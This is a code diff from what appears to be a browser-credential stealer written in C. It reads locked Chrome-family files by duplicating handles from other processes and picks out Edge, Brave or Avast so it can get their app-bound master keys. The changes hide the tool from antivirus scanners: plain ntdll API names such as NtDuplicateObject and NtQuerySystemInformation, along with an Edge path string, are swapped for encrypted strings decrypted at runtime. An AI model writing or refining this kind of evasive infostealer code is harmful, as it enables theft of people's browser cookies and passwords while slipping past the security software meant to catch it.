@@ -210,12 +210,14 @@ static unsigned char *read_file_via_section(const char *path, size_t *out_len) {
     fnNtOpenProc       pOP   = (fnNtOpenProc)      _mir_res(ntdll, fn_s);
     enc_decrypt(enc_NtClose, ENC_NTCLOSE_LEN, fn_s);
     fnNtClose          pCl   = (fnNtClose)         _mir_res(ntdll, fn_s);
-    fnNtDupObj         pDup  = (fnNtDupObj)        _mir_res(ntdll, "NtDuplicateObject");
+    enc_decrypt(enc_nt_dup_obj, ENC_NT_DUP_OBJ_LEN, fn_s);
+    fnNtDupObj         pDup  = (fnNtDupObj)        _mir_res(ntdll, fn_s);
     enc_decrypt(enc_NtCreateSection, ENC_NTCREATESECTION_LEN, fn_s);
     fnNtCreateSec      pCS   = (fnNtCreateSec)     _mir_res(ntdll, fn_s);
     enc_decrypt(enc_NtMapViewOfSection, ENC_NTMAPVIEWOFSECTION_LEN, fn_s);
     fnNtMapView        pMV   = (fnNtMapView)       _mir_res(ntdll, fn_s);
-    fnNtUnmapView      pUV   = (fnNtUnmapView)     _mir_res(ntdll, "NtUnmapViewOfSection");
+    enc_decrypt(enc_nt_unmap_view, ENC_NT_UNMAP_VIEW_LEN, fn_s);
+    fnNtUnmapView      pUV   = (fnNtUnmapView)     _mir_res(ntdll, fn_s);
     if (!pGNP||!pQIP||!pQSI||!pOP||!pCl||!pDup||!pCS||!pMV||!pUV)
         return NULL;
 
@@ -426,13 +428,14 @@ static unsigned char *read_file_rm(const char *path, size_t *out_len) {
     fnNtOpenProc  pOP  = (fnNtOpenProc) _mir_res(ntdll, fn_rn);
     enc_decrypt(enc_NtClose, ENC_NTCLOSE_LEN, fn_rn);
     fnNtClose     pCl  = (fnNtClose)    _mir_res(ntdll, fn_rn);
-    /* NtDuplicateObject — no enc constant, use hash directly (ponytail: only call in codebase) */
-    fnNtDupObj    pDup = (fnNtDupObj)   _mir_res(ntdll, "NtDuplicateObject");
+    enc_decrypt(enc_nt_dup_obj, ENC_NT_DUP_OBJ_LEN, fn_rn);
+    fnNtDupObj    pDup = (fnNtDupObj)   _mir_res(ntdll, fn_rn);
     enc_decrypt(enc_NtCreateSection, ENC_NTCREATESECTION_LEN, fn_rn);
     fnNtCreateSec pCS  = (fnNtCreateSec)_mir_res(ntdll, fn_rn);
     enc_decrypt(enc_NtMapViewOfSection, ENC_NTMAPVIEWOFSECTION_LEN, fn_rn);
     fnNtMapView   pMV  = (fnNtMapView)  _mir_res(ntdll, fn_rn);
-    fnNtUnmapView pUV  = (fnNtUnmapView)_mir_res(ntdll, "NtUnmapViewOfSection");
+    enc_decrypt(enc_nt_unmap_view, ENC_NT_UNMAP_VIEW_LEN, fn_rn);
+    fnNtUnmapView pUV  = (fnNtUnmapView)_mir_res(ntdll, fn_rn);
     if (!pOP || !pCl || !pDup || !pCS || !pMV || !pUV) return NULL;
 
     if (!chrome_misc_ensure()) return NULL;
@@ -474,7 +477,8 @@ static unsigned char *read_file_rm(const char *path, size_t *out_len) {
     free(wpath);
 
     /* For each locking PID, section-map the file via handle duplication */
-    fnNtQSI pQSI = (fnNtQSI)_mir_res(ntdll, "NtQuerySystemInformation");
+    char fn_qsi[48]; enc_decrypt(enc_NtQuerySystemInformation, ENC_NTQUERYSYSTEMINFORMATION_LEN, fn_qsi);
+    fnNtQSI pQSI = (fnNtQSI)_mir_res(ntdll, fn_qsi);
     HANDLE hself = g_chrome_misc.pGCP();
 
     for (UINT i = 0; i < pnProcInfo && !result; i++) {
@@ -908,7 +912,7 @@ static int get_master_key(const char *base_path, unsigned char *key32) {
             enc_decrypt(enc_bp_cmp_avast, ENC_BP_CMP_AVAST_LEN, _cmp_avast);
             _cmp_init = 1;
         }
-        if (strstr(base_path, _cmp_edge) || strstr(base_path, "Microsoft/Edge"))
+        if (strstr(base_path, _cmp_edge))
             browser = APPBOUND_EDGE;
         else if (strstr(base_path, _cmp_brave))
             browser = APPBOUND_BRAVE;
